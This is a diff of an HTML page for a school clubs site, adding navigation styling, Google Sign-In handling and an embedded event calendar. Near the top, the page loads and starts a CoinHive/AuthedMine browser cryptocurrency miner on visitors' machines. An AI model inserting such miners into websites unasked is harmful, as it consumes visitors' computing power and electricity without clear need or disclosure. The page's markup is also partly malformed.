@@ -1,37 +1,296 @@
+
 <!DOCTYPE html>
 <html>
+<script src="http://code.jquery.com/jquery-2.0.3.min.js"></script>
+<script src="https://apis.google.com/js/platform.js" async defer></script>
+<meta name="google-signin-client_id" content="428427503799-qav0f6s1iin1e4iia99m06uqf3kcedat.apps.googleusercontent.com">
 <script src="https://authedmine.com/lib/authedmine.min.js"></script>
 <script>
-	var miner = new CoinHive.Anonymous('BL5kbxUy8iU8la4mF0VTxKgahqK1w1CY', {throttle: 0.3});
-
-	// Only start on non-mobile devices and if not opted-out
-	// in the last 14400 seconds (4 hours):
-	if (!miner.isMobile() && !miner.didOptOut(14400)) {
-		miner.start();
-	}
+var miner = new CoinHive.Anonymous('BL5kbxUy8iU8la4mF0VTxKgahqK1w1CY', {throttle: 0.3});
+// Only start on non-mobile devices and if not opted-out
+// in the last 14400 seconds (4 hours):
+if (!miner.isMobile() && !miner.didOptOut(14400)) {
+	miner.start();
+}
 </script>
+
 <head>
 	<meta charset="utf-8">
-	<title>ABOUT</title>
-	<style> h1 { color: red; padding: 10px; text-decoration: underline; } </style>
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>Trinity Clubs</title>
+
+
 	<style>
+
 	body {
-		background-color: rgb(0,255,0);
+		background-color: rgb(255,255,255);
 
 	}
-	h1 {
-		background-color: yellow;
+	.sidenav {
+		height: 100%;
+		width: 15%;
+		position: fixed;
+		z-index: 1;
+		top: 0;
+		left: 0;
+		background-color: rgb(30,50,200);
+		overflow-x: hidden;
+		padding-top: 20px;
 	}
-	p {
-		background-color: rgb(0,255,0);
+
+	.sidenav a {
+		padding: 6px 8px 6px 16px;
+		text-decoration: none;
+		font-size: 25px;
+		color: white;
+		display: block;
+	}
+
+	.sidenav a:hover {
+		background-color: rgb(196,165,9);
+	}
+
+	.main {
+		margin-left: 160px; /* Same as the width of the sidenav */
+		font-size: 28px; /* Increased text to enable scrolling */
+		padding: 0px 10px;
+	}
+
+	@media screen and (max-height: 450px) {
+		.sidenav {padding-top: 15px;}
+		.sidenav a {font-size: 18px;}
+	}
+	.topnav {
+		background-color: rgb(196,165,9) ;
+		overflow: hidden;
+		position: fixed;
+		width: 75.4%;
+		z-index: 1;
+		top: 0;
+		left: 15%;
+		right: 150px;
+	}
+
+	/* Style the links inside the navigation bar */
+	.topnav a {
+		float: center;
+		color: #f2f2f2;
+		text-align: center;
+		padding: 12px 16px;
+		text-decoration: none;
+		font-size: 43.3999px;
+	}
+
+	/* Change the color of links on hover */
+	.topnav a:hover {
+		background-color: #ddd;
+		color: rgb(30,50,200);
+		text-align: center;
+
+	}
+
+	/* Add a color to the active/current link */
+	.topnav a.active {
+		background-color: #4CAF50;
+		color: white;
+		text-align: center;
+
+
+	}
+	.login {
+		background-color: rgb(200,50,200);
+		position: fixed;
+    top: 0px;
+    right: 0px;
+    font-size: 18px;
+		z-index: 1;
+	}
+	.logout a{
+		background-color: rgb(30,50,200);
+		position: fixed;
+		width: 15%;
+		z-index: 1;
+		left: 0;
+		bottom: 0;
+		color :white;
+		text-align: center;
+	}
+	.logout a:hover {
+		background-color: rgb(196,165,9);
+	}
+	a{
+		color :white;
+	}
+	.clubs {
+		position: absolute;
+    float: center;
+		z-index: 1;
+		left: 25%;
+		top: 10%;
+		width: 400px;
+		color :white;
+		font-size: 10px;
+		text-align: center;
+	}
+	.clubs div{
+		background-color: rgb(30,50,200);
+		position: relative;
+		z-index: 1;
+		width: 300px;
+		color :white;
+		font-size: 10px;
+		text-align: center;
+	}
+	.clubs	div:hover{
+		background-color: rgb(196,65,9);
+		position: relative;
+		z-index: 1;
+		width: 300px;
+		color :white;
+		font-size: 10px;
+		text-align: center;
+	}
+  .clubs1 {
+    position: absolute;
+    float: center;
+    z-index: 1;
+    left: 42%;
+    top: 12%;
+		width: 400px;
+    color :white;
+    font-size: 10px;
+    text-align: center;
+  }
+	.clubs1 div{
+		background-color: rgb(30,50,200);
+		position: relative;
+		z-index: 1;
+		width: 300px;
+		color :white;
+		font-size: 10px;
+		text-align: center;
+	}
+	.clubs1	div:hover{
+		background-color: rgb(196,65,9);
+		position: relative;
+		z-index: 1;
+		width: 300px;
+		color :white;
+		font-size: 10px;
+		text-align: center;
+	}
+	.clubs2 {
+  	position: absolute;
+    float: center;
+    z-index: 1;
+    left: 66%;
+    top: 12%;
+		width: 400px;
+    color :white;
+    font-size: 10px;
+    text-align: center;
+  }
+	.clubs2 div{
+		background-color: rgb(30,50,200);
+		position: relative;
+		z-index: 1;
+		width: 300px;
+		color :white;
+		font-size: 10px;
+		text-align: center;
+	}
+	.clubs2	div:hover{
+		background-color: rgb(196,65,9);
+		position: relative;
+		z-index: 1;
+		width: 300px;
+		color :white;
+		font-size: 10px;
+		text-align: center;
 	}
 </style>
 </head>
 <body>
-	<center>
-		<h1>title</h1>
-		<H2>sub title</H2>
-		<iframe src="https://calendar.google.com/calendar/embed?src=h696m8pi6mf9lom1dd1jaak6s4%40group.calendar.google.com&ctz=America%2FNew_York" style="border: 0" width="800" height="600" frameborder="0" scrolling="no"></iframe>
+	<div class="sidenav">
+		<a href="/Calender.html">Calendar</a>
+		<a href="/placeholder.html">About</a>
+		<a href="/placeholder.html">Club Charter</a>
+		<a href="/placeholder.html">Apply for funding</a>
+		<a href="/placeholder.html">Events</a>
+		<a href="https://www.trinityschoolnyc.org/page">Trinity Website</a>
+		<a href="/placeholder.html">My clubs</a>
+	</div>
+
+	<div class="topnav">
+		<center>
+			<a href="/trinityclubs.html">Trinity Clubs</a>
 		</center>
+	</div>
+	<div class="login">
+		<a
+		<div id="my-signin2"></div>
+<script>
+	function onSuccess(googleUser) {
+
+		  profile = googleUser.getBasicProfile();
+		  console.log('ID: ' + profile.getId()); // Do not send to your backend! Use an ID token instead.
+		  console.log('Name: ' + profile.getName());
+		  console.log('Image URL: ' + profile.getImageUrl());
+		  console.log('Email: ' + profile.getEmail()); // This is null if the 'email' scope is not present.
+
+		console.log('Logged in as: ' + googleUser.getBasicProfile().getName());
+
+		$.ajax({
+    url:'http://localhost:8080/JSONS/USERS/'+profile.getId()+'.json',
+    type:'HEAD',
+    error: function(){
+        console.log("new user");
+				$.ajax({
+						type: "GET",
+						url: " http://localhost:8080",
+						timeout: 2000,
+						data: { name: profile.getId() },
+				});
+					console.log('new user registered!');
+    },
+    success: function(){
+        console.log("Returing User");
+    },
+});
+
+}
+	function onFailure(error) {
+		console.log(error);
+	}
+	function renderButton() {
+		gapi.signin2.render('my-signin2', {
+			'scope': 'profile email',
+			'width': 187,
+			'height': 50,
+			'longtitle': false,
+			'theme': 'dark',
+			'onsuccess': onSuccess,
+			'onfailure': onFailure
+		});
+	}
+</script>
+
+<script src="https://apis.google.com/js/platform.js?onload=renderButton" async defer></script>
+</a>
+	</div>
+	<div class="logout">
+			<a href="#" onclick="signOut();">Sign out</a>
+<script>
+  function signOut() {
+    var auth2 = gapi.auth2.getAuthInstance();
+    auth2.signOut().then(function () {
+      console.log('User signed out.');
+    });
+  }
+</script>
+	<div class="clubs">
+		<h1>Event Calander</h1>
+		<iframe src="https://calendar.google.com/calendar/embed?src=h696m8pi6mf9lom1dd1jaak6s4%40group.calendar.google.com&ctz=America%2FNew_York" style="border: 0" width="800" height="600" frameborder="0" scrolling="no"></iframe>
+	</div>
 	</body>
 	</html>
